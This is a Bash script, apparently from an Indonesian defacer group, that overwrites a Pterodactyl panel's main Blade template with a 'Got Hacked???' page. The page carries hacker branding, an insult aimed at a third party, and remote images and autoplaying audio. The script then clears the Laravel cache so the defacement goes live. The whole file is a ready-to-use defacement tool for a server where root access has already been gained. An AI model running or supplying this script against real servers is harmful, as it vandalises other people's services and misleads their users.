#!/bin/bash

# Auto Deface Pterodactyl by RENDZZ
# Script ini akan mengubah tampilan panel Pterodactyl dengan HTML kustom

# =============================================
# KONFIGURASI
# =============================================

# Warna untuk output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Lokasi file blade template Pterodactyl (default)
PTERODACTYL_BLADE="/var/www/pterodactyl/resources/views/templates/wrapper.blade.php"
PTERODACTYL_BLADE_BACKUP="/var/www/pterodactyl/resources/views/templates/wrapper.blade.php.bak"

# File HTML deface (akan dibuat sementara)
TEMP_HTML_FILE="/tmp/pterodactyl_deface_rendzz.html"

# =============================================
# FUNGSI
# =============================================

# Menampilkan banner
show_banner() {
    clear
    echo -e "${RED}================================================${NC}"
    echo -e "${GREEN}    AUTO DEFACE PTERODACTYL - BY RENDZZ       ${NC}"
    echo -e "${RED}================================================${NC}"
    echo -e "${YELLOW}    Twitter: @rendzz_zone                      ${NC}"
    echo -e "${YELLOW}    BUY VPS @lynnnn046                          ${NC}"
    echo -e "${RED}================================================${NC}"
    echo ""
}

# Cek dan install dependensi
check_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    
    # Cek apakah curl terinstall
    if ! command -v curl &> /dev/null; then
        echo -e "${YELLOW}[!] curl not found. Installing...${NC}"
        apt-get update && apt-get install curl -y
    fi
    
    # Cek apakah unzip terinstall
    if ! command -v unzip &> /dev/null; then
        echo -e "${YELLOW}[!] unzip not found. Installing...${NC}"
        apt-get update && apt-get install unzip -y
    fi
    
    echo -e "${GREEN}[✓] All dependencies installed.${NC}"
}

# Backup file asli
backup_original() {
    echo -e "${BLUE}[*] Creating backup of original file...${NC}"
    
    if [ -f "$PTERODACTYL_BLADE" ]; then
        cp "$PTERODACTYL_BLADE" "$PTERODACTYL_BLADE_BACKUP"
        echo -e "${GREEN}[✓] Backup created at: $PTERODACTYL_BLADE_BACKUP${NC}"
    else
        echo -e "${RED}[✗] Pterodactyl installation not found at default path!${NC}"
        echo -e "${YELLOW}[!] Please enter your Pterodactyl installation path:${NC}"
        read -p "Path: " custom_path
        PTERODACTYL_BLADE="$custom_path/resources/views/templates/wrapper.blade.php"
        PTERODACTYL_BLADE_BACKUP="$custom_path/resources/views/templates/wrapper.blade.php.bak"
        
        if [ -f "$PTERODACTYL_BLADE" ]; then
            cp "$PTERODACTYL_BLADE" "$PTERODACTYL_BLADE_BACKUP"
            echo -e "${GREEN}[✓] Backup created at: $PTERODACTYL_BLADE_BACKUP${NC}"
        else
            echo -e "${RED}[✗] File still not found! Exiting...${NC}"
            exit 1
        fi
    fi
}

# Membuat file HTML deface
create_deface_html() {
    echo -e "${BLUE}[*] Creating deface HTML template...${NC}"
    
    # Menggabungkan semua HTML menjadi satu file dengan format yang benar
    cat > "$TEMP_HTML_FILE" << 'EOF'
<!-- Generator by NathanPrinsley -->
<!-- Tools : https://script-deface-generator.prinsh.com -->
<!DOCTYPE html>
<html>
<head>
    <title>Got Hacked??? RENDZZ - BUY VPS @lynnnn046</title>
    <meta charset="UTF-8"/>
    <meta name="author" content="RENDZZ"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta name="description" content=""/>
    <meta property="og:title" content="Got Hacked??? RENDZZ - BUY VPS @lynnnn046"/>
    <meta name="keywords" content="RENDZZ - BUY VPS @lynnnn046, Got Hacked??? RENDZZ ,hacked by RENDZZ ,haxor uploader, haxor script deface generator, nathan prinsley, mr.prins, prinsh, hacked by, haxor my id"/>
    <meta property="og:image" content="https://cdn.prinsh.com/data-1/images/NathanPrinsley-no-estoy-feliz.gif"/>
    <meta property="og:type" content="website"/>
    <meta property="og:site_name" content="Haxor Uploader"/>
    <link rel="shortcut icon" type="image/x-icon" href="https://cdn.prinsh.com/data-1/images/NathanPrinsley-no-estoy-feliz.gif" />
    <link rel="stylesheet" type="text/css" href="https://cdn.prinsh.com/NathanPrinsley-textstyle/nprinsh-stext.css"/>
    <style>
        body {
            background: url("https://cdn.prinsh.com/data-1/images/NathanPrinsley-sad-girl.gif") no-repeat center center fixed;
            background-size: 100% 100%;
            font-family: Calibri;
            margin-top: 35px;
        }
        h1, h2 {
            margin-top: .3em;
            margin-bottom: .3em;
        }
        h1.nprinsleyy {
            color: #dbd9d9;
        }
        h2 {
            color: #dbd9d9;
        }
        p.message_prinsley {
            color: #dbd9d9;
            margin-top: .25em;
            margin-bottom: .25em;
            font-size: 16px;
            font-weight: unset;
        }
        .hubungi_prinsh {
            color: #00eb00;
            text-decoration: none;
        }
        .hubungi_prinsh:hover {
            color: red;
        }
        .othermes_nprinsh {
            color: #dbd9d9;
            font-size: 16px;
        }
        marquee.foonathanPrinsley {
            display: none;
            position: fixed;
            width: 100%;
            bottom: 0px;
            font-family: Tahoma;
            height: 20px;
            color: white;
            left: 0px;
            border-top: 2px solid darkred;
            padding: 5px;
            background-color: #000;
        }
    </style>
</head>
<body>
    <center>
        <img src="https://cdn.prinsh.com/data-1/images/NathanPrinsley-no-estoy-feliz.gif" style="width: 20%">
        <h1 class="nprinsleyy nprinsley-text-rainbowan" style="font-size:32px;">Got Hacked??? RENDZZ</h1>
        <h2 style="font-size:24px;" class="nathan-prinsley_none">QWEEEN SCAM RECEH</h2>
        <p class="message_prinsley nathan-prinsley_none"></p>
        <p style="font-size:14px;" class="nathan-prinsley_none">
            <a class="hubungi_prinsh" href="mailto:"></a>
        </p>
        <p class="othermes_nprinsh nathan-prinsley_none">qween scam receh gatau malu</p>
        <audio src="https://files.catbox.moe/ek406d.mp3" autoplay="1" loop="1"></audio>
        <marquee class="foonathanPrinsley">
            <b style="color: #dbd9d9;font-size:16px;" class="nathan-prinsley_none"></b>
        </marquee>
    </center>
</body>
</html>
<!-- Generator by Nathan Prinsley - https://script-deface-generator.prinsh.com -->
EOF

    echo -e "${GREEN}[✓] Deface HTML created successfully!${NC}"
}

# Mengganti file blade dengan HTML deface
replace_blade_file() {
    echo -e "${BLUE}[*] Replacing Pterodactyl template...${NC}"
    
    # Membaca file HTML deface
    DEFACE_CONTENT=$(cat "$TEMP_HTML_FILE")
    
    # Escape karakter khusus untuk sed
    DEFACE_CONTENT_ESCAPED=$(printf '%s\n' "$DEFACE_CONTENT" | sed 's/[\/&]/\\&/g')
    
    # Tulis ke file blade (overwrite)
    echo "$DEFACE_CONTENT" > "$PTERODACTYL_BLADE"
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] Template replaced successfully!${NC}"
    else
        echo -e "${RED}[✗] Failed to replace template!${NC}"
        exit 1
    fi
}

# Membersihkan cache Laravel
clear_cache() {
    echo -e "${BLUE}[*] Clearing Laravel cache...${NC}"
    
    # Cek lokasi php
    PHP_PATH=$(which php)
    
    if [ -f "/var/www/pterodactyl/artisan" ]; then
        cd /var/www/pterodactyl
        $PHP_PATH artisan view:clear
        $PHP_PATH artisan cache:clear
        $PHP_PATH artisan config:clear
        echo -e "${GREEN}[✓] Cache cleared successfully!${NC}"
    else
        echo -e "${YELLOW}[!] Artisan not found at default path. Please clear cache manually.${NC}"
    fi
}

# Menampilkan pesan sukses
show_success() {
    echo -e "${RED}================================================${NC}"
    echo -e "${GREEN}         DEFACE BERHASIL DIPASANG!            ${NC}"
    echo -e "${RED}================================================${NC}"
    echo -e "${YELLOW}Website Pterodactyl Anda sekarang telah berubah!${NC}"
    echo -e "${CYAN}Audio autoplay: https://files.catbox.moe/ek406d.mp3${NC}"
    echo -e "${PURPLE}Backup disimpan di: $PTERODACTYL_BLADE_BACKUP${NC}"
    echo ""
    echo -e "${WHITE}Untuk mengembalikan ke tampilan asli:${NC}"
    echo -e "${GREEN}cp $PTERODACTYL_BLADE_BACKUP $PTERODACTYL_BLADE${NC}"
    echo -e "${GREEN}cd /var/www/pterodactyl && php artisan view:clear${NC}"
    echo -e "${RED}================================================${NC}"
}

# =============================================
# EKSEKUSI UTAMA
# =============================================

# Cek root privileges
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}Script ini harus dijalankan sebagai root!${NC}" 
   exit 1
fi

# Tampilkan banner
show_banner

# Konfirmasi
echo -e "${YELLOW}PERINGATAN: Script ini akan mengubah tampilan Pterodactyl Anda!${NC}"
echo -e "${YELLOW}Pastikan Anda memiliki akses SSH untuk mengembalikan jika diperlukan.${NC}"
echo ""
read -p "Lanjutkan? (y/n): " -n 1 -r
echo ""
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo -e "${RED}Dibatalkan.${NC}"
    exit 1
fi

# Eksekusi fungsi berurutan
echo ""
check_dependencies
echo ""
backup_original
echo ""
create_deface_html
echo ""
replace_blade_file
echo ""
clear_cache
echo ""
show_success

# Hapus file temporary
rm -f "$TEMP_HTML_FILE"

exit 0
